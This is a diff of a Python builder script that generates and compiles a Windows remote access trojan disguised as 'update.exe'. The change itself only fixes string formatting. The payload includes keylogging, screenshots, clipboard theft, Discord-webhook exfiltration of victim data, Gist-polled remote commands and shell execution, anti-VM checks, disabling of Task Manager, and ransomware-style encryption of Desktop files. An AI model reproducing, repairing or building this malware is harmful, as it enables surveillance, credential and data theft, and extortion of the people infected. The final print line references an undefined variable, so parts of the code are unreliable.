@@ -28,14 +28,14 @@ webhook_url = input("Discord webhook URL (main one for initial bite): ").strip()
 command_url = input("Gist raw URL (FIXED_RAW_URL): ").strip()
 output_name = "update.exe"
 
-rat_code = f'''import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
+rat_code = '''import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
 from PIL import ImageGrab
 from pynput.keyboard import Listener, Key
 from cryptography.fernet import Fernet
 import winreg
 
-WEBHOOK_URL = "{webhook_url}"
-COMMAND_URL = "{command_url}"
+WEBHOOK_URL = "{}"
+COMMAND_URL = "{}"
 POLL_INTERVAL = 15
 VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
 KEYLOG_BUFFER = ""
@@ -43,9 +43,11 @@ KEYLOG_BUFFER = ""
 def send(msg="", embed=None, file=None):
     global WEBHOOK_URL
     if msg:
-        msg = f"[{{VICTIM_ID}}] {{msg}}"  # Doubled braces = literal {VICTIM_ID}
+        msg = "[{}] " + msg
+        msg = msg.format(VICTIM_ID)
     if embed and "title" in embed:
-        embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
+        embed["title"] = "[{}] " + embed["title"]
+        embed["title"] = embed["title"].format(VICTIM_ID)
     data = {{"content": msg}}
     if embed:
         data["embeds"] = [embed]
@@ -60,10 +62,9 @@ def info():
         ip = requests.get("https://api.ipify.org", timeout=5).text
     except:
         ip = "Unknown"
-    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
+    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": "**Victim ID:** {}\\n**User:** {}\\n**PC:** {}\\n**IP:** {}".format(VICTIM_ID, getpass.getuser(), socket.gethostname(), ip), "color": 16711680}}
     send(embed=embed)
 
-# Rest of the code unchanged - all functions from previous version
 def anti_vm():
     try:
         if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
@@ -89,9 +90,9 @@ def on_press(key):
     try:
         KEYLOG_BUFFER += key.char
     except:
-        KEYLOG_BUFFER += f" [{{str(key)}}] "
+        KEYLOG_BUFFER += " [{}] ".format(str(key))
     if len(KEYLOG_BUFFER) > 500:
-        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
+        send("Keylog dump:\\n{}".format(KEYLOG_BUFFER))
         KEYLOG_BUFFER = ""
 
 def screenshot():
@@ -110,7 +111,7 @@ def toggle_tm(enable=True):
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
         winreg.CloseKey(key)
-        send(f"Task Manager {{'enabled' if enable else 'disabled'}}")
+        send("Task Manager {}" .format("enabled" if enable else "disabled"))
     except:
         pass
 
@@ -122,7 +123,7 @@ def bsod():
 def encrypt(path=os.path.expanduser("~\\Desktop")):
     key = Fernet.generate_key()
     f = Fernet(key)
-    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
+    send("ENCRYPTION KEY - SAVE IT: {}".format(key.decode()))
     count = 0
     exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
     for root, _, files in os.walk(path):
@@ -138,17 +139,17 @@ def encrypt(path=os.path.expanduser("~\\Desktop")):
                     count += 1
                 except:
                     pass
-    send(f"Encrypted {{count}} files in {{path}}")
+    send("Encrypted {} files in {}".format(count, path))
 
 def shell(cmd):
     try:
         out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
     except Exception as e:
         out = str(e)
-    send(f"Shell output:\\n{{out[:3000]}}")
+    send("Shell output:\\n{}".format(out[:3000]))
 
 def clipboard():
-    send(f"Clipboard: {{pyperclip.paste()}}")
+    send("Clipboard: {}".format(pyperclip.paste()))
 
 def reboot():
     subprocess.call("shutdown /r /t 0", shell=True)
@@ -163,7 +164,7 @@ def runscript(code):
         exec(code)
         send("Script executed")
     except Exception as e:
-        send(f"Script error: {{str(e)}}")
+        send("Script error: {}".format(str(e)))
 
 def setwebhook(url):
     global WEBHOOK_URL
@@ -179,7 +180,7 @@ def poll():
                 parts = full.split(" ", 1)
                 cmd = parts[0].lower()
                 arg = parts[1] if len(parts) > 1 else ""
-                send(f"Command received: {{full}}")
+                send("Command received: {}".format(full))
                 if cmd == "ss":
                     screenshot()
                 elif cmd == "lock":
@@ -216,12 +217,12 @@ if __name__ == "__main__":
     threading.Thread(target=poll, daemon=True).start()
     with Listener(on_press=on_press) as l:
         l.join()
-'''
+'''.format(webhook_url, command_url)
 
 with open("rat.py", "w") as f:
     f.write(rat_code)
 
-print("Building fixed RAT - no more brace errors...")
+print("Building brace-proof RAT...")
 subprocess.run([
     "pyinstaller","--onefile","--noconsole",
     "--collect-all","pynput",
@@ -235,7 +236,7 @@ shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"Clean EXE ready: dist\\{output_name}")
+print(f"Done - no more {VICTIM_ID} brace bullshit. EXE at dist\\{output_name}")
 
 
 
